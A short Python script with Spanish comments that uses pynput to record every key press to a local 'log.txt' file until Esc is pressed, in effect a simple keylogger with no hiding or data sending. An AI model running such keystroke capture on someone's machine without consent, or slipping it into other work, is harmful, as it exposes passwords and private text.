import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Si la tecla es un carácter, como una letra o número
        with open("log.txt", "a") as log_file:
            log_file.write(f"Tecla presionada: {key.char}\n")
    except AttributeError:
        # Si la tecla no es un carácter (por ejemplo, una tecla especial como Shift o Ctrl)
        if key == Key.space:
            with open("log.txt", "a") as log_file:
                log_file.write("Tecla presionada: [ESPACIO]\n")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            with open("log.txt", "a") as log_file:
                log_file.write("Tecla presionada: [CTRL]\n")
        elif key == Key.shift:
            with open("log.txt", "a") as log_file:
                log_file.write("Tecla presionada: [SHIFT]\n")
        elif key == Key.enter:
            with open("log.txt", "a") as log_file:
                log_file.write("Tecla presionada: [ENTER]\n")
        else:
            with open("log.txt", "a") as log_file:
                log_file.write(f"Tecla especial presionada: {key}\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
